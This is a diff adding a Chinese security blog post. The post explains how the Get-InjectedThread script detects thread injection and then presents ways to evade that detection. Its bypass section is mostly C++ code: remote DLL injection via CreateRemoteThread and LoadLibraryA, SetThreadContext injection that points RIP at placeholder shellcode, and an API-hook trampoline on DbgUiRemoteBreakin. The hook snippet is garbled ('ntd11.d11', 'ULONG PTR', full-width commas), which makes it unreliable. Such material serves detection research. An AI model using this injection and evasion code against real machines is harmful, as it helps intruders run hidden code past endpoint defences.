@@ -1,0 +1,796 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.3" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.3">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.3">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.3">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.3" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Hexo, NexT" />
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="HaCky的安全备忘录" type="application/atom+xml" />
+
+
+
+
+
+
+<meta name="description" content="本文以Get-InjectedThread脚本为例，概括了检测线程注入的方法">
+<meta property="og:type" content="article">
+<meta property="og:title" content="detect threat inject —— 以Get-InjectedThread为例">
+<meta property="og:url" content="https://findream.github.io/2023/02/20/detect thread Inject——以Get-InjectedThread为例/index.html">
+<meta property="og:site_name" content="HaCky的安全备忘录">
+<meta property="og:description" content="本文以Get-InjectedThread脚本为例，概括了检测线程注入的方法">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:updated_time" content="2023-02-20T13:40:37.606Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="detect threat inject —— 以Get-InjectedThread为例">
+<meta name="twitter:description" content="本文以Get-InjectedThread脚本为例，概括了检测线程注入的方法">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '5.1.3',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://findream.github.io/2023/02/20/detect thread Inject——以Get-InjectedThread为例/"/>
+
+
+
+
+
+  <title>detect threat inject —— 以Get-InjectedThread为例 | HaCky的安全备忘录</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">HaCky的安全备忘录</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-schedule">
+          <a href="/schedule/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-calendar"></i> <br />
+            
+            日程表
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-sitemap">
+          <a href="/sitemap.xml" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-sitemap"></i> <br />
+            
+            站点地图
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-commonweal">
+          <a href="/404/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-heartbeat"></i> <br />
+            
+            公益404
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://findream.github.io/2023/02/20/detect thread Inject——以Get-InjectedThread为例/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="HaCky">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="HaCky的安全备忘录">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">detect threat inject —— 以Get-InjectedThread为例</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2023-02-20T20:45:11+08:00">
+                2023-02-20
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/红蓝对抗/" itemprop="url" rel="index">
+                    <span itemprop="name">红蓝对抗</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <ul>
+<li>本文以Get-InjectedThread脚本为例，概括了检测线程注入的方法<a id="more"></a>
+</li>
+</ul>
+<h2 id="0x01-线程注入检测原理"><a href="#0x01-线程注入检测原理" class="headerlink" title="0x01 线程注入检测原理"></a>0x01 线程注入检测原理</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<a href="https://gist.github.com/jaredcatkinson/23905d34537ce4b5b1818c3e6405c1d2" target="_blank" rel="external">Get-InjectedThread</a>是由Joe Desimone和Jared Atkinson发布的powershell 线程注入检测脚本。通过检测线程的的状态和类型，如果内存类型不为<code>MEM_IMAGE</code>,则说明存在注入。</p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Get-InjectedThread的具体检测逻辑是这样的:</p>
+<ul>
+<li>1) 通过<code>CreateToolhelpSnapshot</code>,<code>Thread32First</code>,<code>Thread32Next</code>遍历所有的线程</li>
+<li>2）调用<code>OpenThread</code>获取目标线程的线程句柄</li>
+<li>3）调用<code>NtQueryInformationThread</code>,将ThreadInformationClass参数指定为ThreadQuerySetWin32StartAddress，获取线程内存的起始地址Thread Start Address</li>
+<li>4）调用<code>OpenProcess</code>获取线程对应进程的句柄</li>
+<li>5）将<code>Process Handle</code>和<code>Thread Start Address</code>传递给<code>VirtualQueryEx</code>，获取<code>MEMORY_BASIC_INFORMATION</code>。</li>
+<li>6) 检查<code>MEMORY_BASIC_INFORMATION</code>结构体中状态字段(<code>State</code>)和类型字段(<code>Type</code>),如果内存类型不为<code>MEM_IMAGE</code>,状态是<code>MEM_COMMIT</code>,则说明存在注入。</li>
+</ul>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;根据elastic的John Uhlmann在2022年11月的<a href="https://www.elastic.co/cn/security-labs/get-injectedthreadex-detection-thread-creation-trampolines" target="_blank" rel="external">Get-InjectedThreadEx – Detecting Thread Creation Trampolines一文</a>，已经增加了启发式的方法来检测线程注入。即通过检测线程入口的关键字。</p>
+<ul>
+<li>1）MZ关键字</li>
+<li>2）一些返回，跳转或者无意义填充的字节</li>
+</ul>
+<h2 id="0x02-绕过策略"><a href="#0x02-绕过策略" class="headerlink" title="0x02 绕过策略"></a>0x02 绕过策略</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;John Uhlmann在他的<a href="https://www.elastic.co/cn/security-labs/get-injectedthreadex-detection-thread-creation-trampolines" target="_blank" rel="external">文章</a>描述了几种绕过Get-InjectedThread的方法，但是这些方法都被他修复了。同样的XPN也在2018年针对早期版本的Get-InjectedThread进行了绕过。</p>
+<h3 id="利用Dll规避内存类型和状态检测"><a href="#利用Dll规避内存类型和状态检测" class="headerlink" title="利用Dll规避内存类型和状态检测"></a>利用Dll规避内存类型和状态检测</h3><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;将shellcode包装到dll模块中，然后通过<code>CreateRemoteThread</code>远程线程注入的方式执行，因为线程入口点是<code>LoadLibrary</code>,因此绕过Get-InjectedThread。流程如下：</p>
+<ul>
+<li>1）获取调用地址LoadLibraryA。</li>
+<li>2）在我们的目标进程中分配内存。</li>
+<li>3）将我们的 DLL 的路径写入分配的内存中。</li>
+<li>4）调用以启动新线程，入口点为LoadLibraryA，将DLL路径内存地址作为参数传递。</li>
+</ul>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">example_loadlibrary</span><span class="params">(<span class="keyword">int</span> pid)</span> </span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">	<span class="keyword">char</span> currentDir[MAX_PATH];</div><div class="line">	SIZE_T bytesWritten = <span class="number">0</span>;</div><div class="line">	HANDLE processHandle = OpenProcess(PROCESS_ALL_ACCESS, <span class="literal">false</span>, pid);</div><div class="line">	<span class="keyword">if</span> (processHandle == INVALID_HANDLE_VALUE) &#123;</div><div class="line">		<span class="built_in">printf</span>(<span class="string">"[X] Error: Could not open process with PID %d\n"</span>, pid);</div><div class="line">		<span class="keyword">return</span> <span class="number">1</span>;</div><div class="line">	&#125;</div><div class="line">	<span class="keyword">void</span> *alloc = VirtualAllocEx(processHandle, <span class="number">0</span>, <span class="number">4096</span>, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);</div><div class="line">	<span class="keyword">if</span> (alloc == <span class="literal">NULL</span>) &#123;</div><div class="line">		<span class="built_in">printf</span>(<span class="string">"[X] Error: Could not allocate memory in process\n"</span>);</div><div class="line">		<span class="keyword">return</span> <span class="number">1</span>;</div><div class="line">	&#125;</div><div class="line">	<span class="keyword">void</span> *_loadLibrary = GetProcAddress(LoadLibraryA(<span class="string">"kernel32.dll"</span>), <span class="string">"LoadLibraryA"</span>);</div><div class="line">	<span class="keyword">if</span> (_loadLibrary == <span class="literal">NULL</span>) &#123;</div><div class="line">		<span class="built_in">printf</span>(<span class="string">"[X] Error: Could not find address of LoadLibrary\n"</span>);</div><div class="line">		<span class="keyword">return</span> <span class="number">1</span>;</div><div class="line">	&#125;</div><div class="line">	GetCurrentDirectoryA(MAX_PATH, currentDir);</div><div class="line">	strncat_s(currentDir, <span class="string">"\\injectme.dll"</span>, MAX_PATH);</div><div class="line">	<span class="built_in">printf</span>(<span class="string">"[*] Injecting path to load DLL: %s\n"</span>, currentDir);</div><div class="line">	<span class="keyword">if</span> (!WriteProcessMemory(processHandle, alloc, currentDir, <span class="built_in">strlen</span>(currentDir) + <span class="number">1</span>, &amp;bytesWritten)) &#123;</div><div class="line">		<span class="built_in">printf</span>(<span class="string">"[X] Error: Could not write into process memory\n"</span>);</div><div class="line">		<span class="keyword">return</span> <span class="number">2</span>;</div><div class="line">	&#125;</div><div class="line">	<span class="built_in">printf</span>(<span class="string">"[*] Written %d bytes\n"</span>, bytesWritten);</div><div class="line">	<span class="keyword">if</span> (CreateRemoteThread(processHandle, <span class="literal">NULL</span>, <span class="number">0</span>, (LPTHREAD_START_ROUTINE)_loadLibrary, alloc, <span class="number">0</span>, <span class="literal">NULL</span>) == <span class="literal">NULL</span>) &#123;</div><div class="line">		<span class="built_in">printf</span>(<span class="string">"[X] Error: CreateRemoteThread failed [%d] :(\n"</span>, GetLastError());</div><div class="line">		<span class="keyword">return</span> <span class="number">2</span>;</div><div class="line">	&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<h3 id="SetThreadContext线程注入"><a href="#SetThreadContext线程注入" class="headerlink" title="SetThreadContext线程注入"></a>SetThreadContext线程注入</h3><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;首先，拉起一个挂起的线程，该线程的入口点内存类型为<code>MEM_IMAGE</code>,通过<code>SetThreadContext</code>方法，将线程的入口点设置为Shellcode。在线程被拉起的时候，内存类型为<code>MEM_IMAGE</code>,由此绕过检测。</p>
+<ul>
+<li>1)在目标进程中分配内存来保存我们的 shellcode。</li>
+<li>2)将我们的 shellcode 复制到分配的内存中。</li>
+<li>3)产生一个挂起的线程，将 ThreadProc 设置为任何MEM_IMAGE标记的内存区域。</li>
+<li>4)检索挂起线程的当前寄存器。</li>
+<li>5)更新 RIP 寄存器以指向驻留在已分配内存中的 shellcode。</li>
+<li>6)恢复执行。</li>
+</ul>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> shellcode[<span class="number">256</span>] = &#123;</div><div class="line">	<span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span></div><div class="line">&#125;;</div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">example_switchsuspend</span><span class="params">(<span class="keyword">int</span> pid)</span> </span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">	<span class="keyword">char</span> currentDir[MAX_PATH];</div><div class="line">	SIZE_T bytesWritten = <span class="number">0</span>;</div><div class="line">	HANDLE threadHandle;</div><div class="line">	HANDLE processHandle = OpenProcess(PROCESS_ALL_ACCESS, <span class="literal">false</span>, pid);</div><div class="line">	<span class="keyword">if</span> (processHandle == INVALID_HANDLE_VALUE) &#123;</div><div class="line">		<span class="built_in">printf</span>(<span class="string">"[X] Error: Could not open process with PID %d\n"</span>, pid);</div><div class="line">		<span class="keyword">return</span> <span class="number">1</span>;</div><div class="line">	&#125;</div><div class="line">	<span class="keyword">void</span> *alloc = VirtualAllocEx(processHandle, <span class="number">0</span>, <span class="number">4096</span>, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);</div><div class="line">	<span class="keyword">if</span> (alloc == <span class="literal">NULL</span>) &#123;</div><div class="line">		<span class="built_in">printf</span>(<span class="string">"[X] Error: Could not allocate memory in process\n"</span>);</div><div class="line">		<span class="keyword">return</span> <span class="number">1</span>;</div><div class="line">	&#125;</div><div class="line">	<span class="keyword">void</span> *_loadLibrary = GetProcAddress(LoadLibraryA(<span class="string">"kernel32.dll"</span>), <span class="string">"LoadLibraryA"</span>);</div><div class="line">	<span class="keyword">if</span> (_loadLibrary == <span class="literal">NULL</span>) &#123;</div><div class="line">		<span class="built_in">printf</span>(<span class="string">"[X] Error: Could not find address of LoadLibrary\n"</span>);</div><div class="line">		<span class="keyword">return</span> <span class="number">1</span>;</div><div class="line">	&#125;</div><div class="line">	*(DWORD64 *)(shellcode + <span class="number">26</span>) = (DWORD64)GetProcAddress(LoadLibraryA(<span class="string">"user32.dll"</span>), <span class="string">"MessageBoxA"</span>);</div><div class="line">	<span class="keyword">if</span> (!WriteProcessMemory(processHandle, alloc, shellcode, <span class="keyword">sizeof</span>(shellcode), &amp;bytesWritten)) &#123;</div><div class="line">		<span class="built_in">printf</span>(<span class="string">"[X] Error: Could not write to process memory\n"</span>);</div><div class="line">		<span class="keyword">return</span> <span class="number">2</span>;</div><div class="line">	&#125;</div><div class="line">	<span class="built_in">printf</span>(<span class="string">"[*] Written %d bytes to %p\n"</span>, bytesWritten, alloc);</div><div class="line">	threadHandle = CreateRemoteThread(processHandle, <span class="literal">NULL</span>, <span class="number">0</span>, (LPTHREAD_START_ROUTINE)_loadLibrary, <span class="literal">NULL</span>, CREATE_SUSPENDED, <span class="literal">NULL</span>);</div><div class="line">	<span class="keyword">if</span> (threadHandle == <span class="literal">NULL</span>) &#123;</div><div class="line">		<span class="built_in">printf</span>(<span class="string">"[X] Error: CreateRemoteThread failed [%d] :(\n"</span>, GetLastError());</div><div class="line">		<span class="keyword">return</span> <span class="number">2</span>;</div><div class="line">	&#125;</div><div class="line">	<span class="comment">// Get the current registers set for our thread</span></div><div class="line">	CONTEXT ctx;</div><div class="line">	ZeroMemory(&amp;ctx, <span class="keyword">sizeof</span>(CONTEXT));</div><div class="line">	ctx.ContextFlags = CONTEXT_CONTROL;</div><div class="line">	GetThreadContext(threadHandle, &amp;ctx);</div><div class="line">	<span class="built_in">printf</span>(<span class="string">"[*] RIP register set to %p\n"</span>, ctx.Rip);</div><div class="line">	<span class="built_in">printf</span>(<span class="string">"[*] Updating RIP to point to our shellcode\n"</span>);</div><div class="line">	ctx.Rip = (DWORD64)alloc;</div><div class="line">	<span class="built_in">printf</span>(<span class="string">"[*] Resuming thread execution at our shellcode address\n"</span>);</div><div class="line">	SetThreadContext(threadHandle, &amp;ctx);</div><div class="line">	ResumeThread(threadHandle);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<h3 id="Hook-API函数"><a href="#Hook-API函数" class="headerlink" title="Hook API函数"></a>Hook API函数</h3><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;这个方法就是Hook一个API函数，因为API函数本身内存类型和状态就可以绕过Get-InjectedThread工具。<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">char hook[] = &#123;<span class="number">0x48</span>，<span class="number">0xb8</span>，<span class="number">0x11</span>,<span class="number">0x22</span>,<span class="number">0x33</span>,<span class="number">0x44</span>,<span class="number">0x55</span>,<span class="number">0x66</span>,<span class="number">0x77</span>,<span class="number">0x88</span>,<span class="number">0xff</span>，<span class="number">0xe0</span>&#125;;</div><div class="line">*(ULONG_PTR*)(hook + <span class="number">2</span>) = (ULONG PTR)pShellcode;</div><div class="line">auto pHookedFunc = GetProcAddress(GetModuleHandlew(L<span class="string">"ntd11.d11"</span>), <span class="string">"DbgUiRemoteBreakin"</span>);</div><div class="line">WriteProcessMemory(GetCurrentProcess()，pHookedFunc, hook, sizeof(hook)， NULL);</div><div class="line">CreateThread(NULL，<span class="number">0</span>，(LPTHREAD START ROUTINE)pHookedFunc，NULL，<span class="number">0</span>，NULL);</div></pre></td></tr></table></figure></p>
+<h2 id="0x00-参考文章"><a href="#0x00-参考文章" class="headerlink" title="0x00 参考文章"></a>0x00 参考文章</h2><ul>
+<li><p><a href="https://gist.github.com/jaredcatkinson/23905d34537ce4b5b1818c3e6405c1d2" target="_blank" rel="external">Get-InjectedThread powershell源码</a></p>
+</li>
+<li><p><a href="https://www.elastic.co/cn/security-labs/get-injectedthreadex-detection-thread-creation-trampolines" target="_blank" rel="external">Get-InjectedThreadEx – Detecting Thread Creation Trampolines</a></p>
+</li>
+<li><p><a href="https://posts.specterops.io/defenders-think-in-graphs-too-part-1-572524c71e91" target="_blank" rel="external">Defenders Think in Graphs Too! Part 1</a></p>
+</li>
+<li><p><a href="https://github.com/jdu2600/Get-InjectedThreadEx/blob/main/Get-InjectedThreadEx.ps1" target="_blank" rel="external">升级后的Get-InjectedThreadEx</a></p>
+</li>
+</ul>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2023/02/08/CVE-2018-8120内核提权漏洞分析/" rel="next" title="CVE-2018-8120 内核提权漏洞分析">
+                <i class="fa fa-chevron-left"></i> CVE-2018-8120 内核提权漏洞分析
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">HaCky</p>
+              <p class="site-description motion-element" itemprop="description">我是最菜的HaCky呀</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">78</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                
+                  <span class="site-state-item-count">17</span>
+                  <span class="site-state-item-name">分类</span>
+                
+              </div>
+            
+
+            
+
+          </nav>
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          <div class="links-of-author motion-element">
+            
+          </div>
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-线程注入检测原理"><span class="nav-number">1.</span> <span class="nav-text">0x01 线程注入检测原理</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-绕过策略"><span class="nav-number">2.</span> <span class="nav-text">0x02 绕过策略</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#利用Dll规避内存类型和状态检测"><span class="nav-number">2.1.</span> <span class="nav-text">利用Dll规避内存类型和状态检测</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#SetThreadContext线程注入"><span class="nav-number">2.2.</span> <span class="nav-text">SetThreadContext线程注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Hook-API函数"><span class="nav-number">2.3.</span> <span class="nav-text">Hook API函数</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x00-参考文章"><span class="nav-number">3.</span> <span class="nav-text">0x00 参考文章</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">HaCky</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.3</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+
+  
+  <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.3"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.3"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.3"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.3"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.3"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
